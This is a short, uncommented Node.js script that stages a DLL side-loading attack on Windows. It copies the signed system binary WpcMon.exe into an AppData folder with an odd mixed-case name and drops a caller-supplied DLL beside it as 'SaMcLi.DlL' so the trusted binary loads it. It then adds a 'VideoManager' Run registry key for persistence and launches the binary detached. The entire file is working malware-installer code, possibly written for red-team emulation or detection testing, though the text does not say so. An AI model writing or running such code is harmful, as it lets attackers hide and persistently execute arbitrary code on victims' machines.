const fs = require('fs');
const cp = require('child_process');
const root = 'C:\\Users\\operator\\AppData\\Roaming\\映像\\stage';
const host = 'C:\\Users\\operator\\AppData\\Roaming\\映像\\stage\\wPcMoN.ExE';
fs.mkdirSync(root, { recursive: true });
fs.copyFileSync('C:\\Windows\\System32\\WpcMon.exe', host);
fs.copyFileSync(process.argv[2], root + '\\SaMcLi.DlL');
cp.execFileSync('reg.exe', ['add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', '/v', 'VideoManager', '/t', 'REG_SZ', '/d', host, '/f']);
cp.spawn(host, [], { detached: true });
